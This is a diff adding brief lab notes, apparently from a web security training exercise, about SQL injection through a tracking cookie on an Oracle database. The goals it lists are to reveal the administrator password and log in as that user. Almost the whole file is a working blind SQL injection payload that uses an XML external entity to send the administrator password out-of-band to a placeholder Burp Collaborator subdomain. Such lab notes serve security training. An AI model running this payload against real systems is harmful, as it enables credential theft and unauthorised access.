@@ -1,0 +1,12 @@
+Vulnerable parameter - tracking cookie
+
+Goals:
+1- Display the administrator password 
+2- Login as the administrator user
+
+Analysis:
+--------
+My burp-collaborator: 
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username = 'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
+
